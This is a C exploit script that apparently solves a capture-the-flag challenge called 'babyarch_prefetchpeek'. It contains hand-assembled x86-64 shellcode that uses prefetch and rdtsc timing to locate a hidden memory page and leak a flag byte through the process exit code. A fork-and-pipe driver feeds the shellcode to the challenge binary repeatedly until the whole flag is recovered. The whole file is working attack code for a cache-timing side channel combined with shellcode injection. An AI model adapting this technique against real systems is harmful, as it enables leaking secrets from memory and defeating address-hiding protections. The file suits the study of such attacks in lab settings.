#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
#include <fcntl.h>

// Shellcode template - we'll patch the byte offset at runtime
unsigned char shellcode_template[] = {
    // mov r12, 0x1000000000
    0x49, 0xbc, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    // mov r13, 0x10000000000  
    0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    // mov r14, BYTE_OFFSET (will be patched)
    0x49, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // mov r15, 0x7c
    0x49, 0xbf, 0x7c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    
    // search_loop:
    // cmp r12, r13
    0x4d, 0x39, 0xec,
    // jge not_found
    0x0f, 0x8d, 0x48, 0x00, 0x00, 0x00,
    
    // rdtsc
    0x0f, 0x31,
    // shl rdx, 32
    0x48, 0xc1, 0xe2, 0x20,
    // or rax, rdx
    0x48, 0x09, 0xd0,
    // mov r8, rax
    0x49, 0x89, 0xc0,
    
    // mfence
    0x0f, 0xae, 0xf0,
    // prefetcht2 [r12]
    0x41, 0x0f, 0x18, 0x14, 0x24,
    // mfence  
    0x0f, 0xae, 0xf0,
    
    // rdtsc
    0x0f, 0x31,
    // shl rdx, 32
    0x48, 0xc1, 0xe2, 0x20,
    // or rax, rdx
    0x48, 0x09, 0xd0,
    // sub rax, r8
    0x4c, 0x29, 0xc0,
    
    // mfence
    0x0f, 0xae, 0xf0,
    // cmp rax, r15
    0x4c, 0x39, 0xf8,
    // jl found_candidate
    0x7c, 0x09,
    
    // add r12, 0x1000
    0x49, 0x81, 0xc4, 0x00, 0x10, 0x00, 0x00,
    // jmp search_loop
    0xeb, 0xc3,
    
    // found_candidate:
    // mov rcx, r12
    0x4c, 0x89, 0xe1,
    // add rcx, r14
    0x4c, 0x01, 0xf1,
    
    // mov bl, [rcx]
    0x8a, 0x19,
    
    // mov rax, 60 (exit syscall)
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,
    // mov rdi, rbx
    0x48, 0x89, 0xdf,
    // syscall
    0x0f, 0x05,
    
    // not_found:
    // mov rax, 60
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,
    // mov rdi, 255
    0x48, 0xc7, 0xc7, 0xff, 0x00, 0x00, 0x00,
    // syscall
    0x0f, 0x05
};

void patch_shellcode(unsigned char *shellcode, int byte_offset) {
    // Patch the byte offset at position 22 (mov r14, BYTE_OFFSET)
    *(int*)(shellcode + 22) = byte_offset;
}

int run_exploit(int byte_index) {
    int pipefd[2];
    pid_t pid;
    int status;
    unsigned char shellcode[sizeof(shellcode_template)];
    
    // Copy template and patch byte offset
    memcpy(shellcode, shellcode_template, sizeof(shellcode_template));
    patch_shellcode(shellcode, byte_index);
    
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return -1;
    }
    
    pid = fork();
    if (pid == -1) {
        perror("fork");
        return -1;
    }
    
    if (pid == 0) {
        // Child process
        close(pipefd[1]); // Close write end
        dup2(pipefd[0], STDIN_FILENO); // Redirect stdin to pipe
        close(pipefd[0]);
        
        // Execute the challenge
        execl("./babyarch_prefetchpeek", "babyarch_prefetchpeek", NULL);
        perror("execl");
        exit(1);
    } else {
        // Parent process
        close(pipefd[0]); // Close read end
        
        // Wait a bit for the program to start
        usleep(50000); // 50ms
        
        // Send shellcode
        write(pipefd[1], shellcode, sizeof(shellcode_template));
        close(pipefd[1]);
        
        // Wait for child to finish
        waitpid(pid, &status, 0);
        
        if (WIFEXITED(status)) {
            return WEXITSTATUS(status);
        } else {
            return -1; // Process didn't exit normally
        }
    }
}

int main() {
    char flag[256] = {0};
    int byte_index = 0;
    int max_retries = 3;
    
    printf("Starting flag extraction...\n");
    
    while (byte_index < 255) {
        printf("Attempting to leak byte %d...\n", byte_index);
        
        int success = 0;
        for (int retry = 0; retry < max_retries; retry++) {
            int exit_code = run_exploit(byte_index);
            
            if (exit_code == 255) {
                printf("  Retry %d: Flag not found\n", retry + 1);
                continue;
            } else if (exit_code == 0) {
                printf("End of flag reached (null byte)\n");
                success = 1;
                goto done;
            } else if (exit_code > 0 && exit_code < 256) {
                if (exit_code >= 32 && exit_code <= 126) {
                    // Printable ASCII
                    flag[byte_index] = exit_code;
                    printf("  Found byte %d: '%c' (0x%02x)\n", byte_index, exit_code, exit_code);
                    printf("  Flag so far: %s\n", flag);
                    success = 1;
                    break;
                } else {
                    printf("  Got non-printable byte: 0x%02x\n", exit_code);
                    flag[byte_index] = exit_code;
                    success = 1;
                    break;
                }
            } else {
                printf("  Retry %d: Unexpected exit code %d\n", retry + 1, exit_code);
            }
        }
        
        if (!success) {
            printf("Failed to get byte %d after %d retries\n", byte_index, max_retries);
            break;
        }
        
        byte_index++;
    }
    
done:
    printf("\nFinal flag: %s\n", flag);
    return 0;
}
